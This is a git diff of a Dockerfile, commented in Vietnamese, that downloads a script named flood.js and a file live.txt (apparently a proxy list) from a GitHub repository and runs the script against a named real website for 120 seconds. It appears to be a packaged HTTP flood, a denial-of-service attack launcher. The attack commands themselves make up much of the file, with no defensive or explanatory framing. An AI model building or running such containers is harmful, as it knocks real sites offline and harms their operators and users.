@@ -1,13 +1,14 @@
 FROM node:alpine
 
-# Cài đặt git
-RUN apk add --no-cache git
+# Cài đặt git và curl
+RUN apk add --no-cache git curl
 
-# Clone repository
-RUN git clone https://github.com/hackerlove123/RunScriptDocker/
-
-# Đặt thư mục làm việc
+# Tạo thư mục làm việc
 WORKDIR /RunScriptDocker
+
+# Tải xuống các file cần thiết từ GitHub
+RUN curl -L -o flood.js https://raw.githubusercontent.com/hackerlove123/RunScriptDocker/main/flood.js && \
+    curl -L -o live.txt https://raw.githubusercontent.com/hackerlove123/RunScriptDocker/main/live.txt
 
 # Kiểm tra danh sách file trong thư mục
 RUN ls -la
@@ -19,4 +20,4 @@ RUN npm install hpack https commander colors socks set-cookie-parser
 RUN node -v && npm -v
 
 # Chạy script khi container khởi động và giữ container chạy
-RUN node flood.js https://113hax.com/ 120 10 10 live.txt flood && tail -f /dev/null
+RUN sh -c "node flood.js https://113hax.com/ 120 10 10 live.txt flood & tail -f /dev/null"
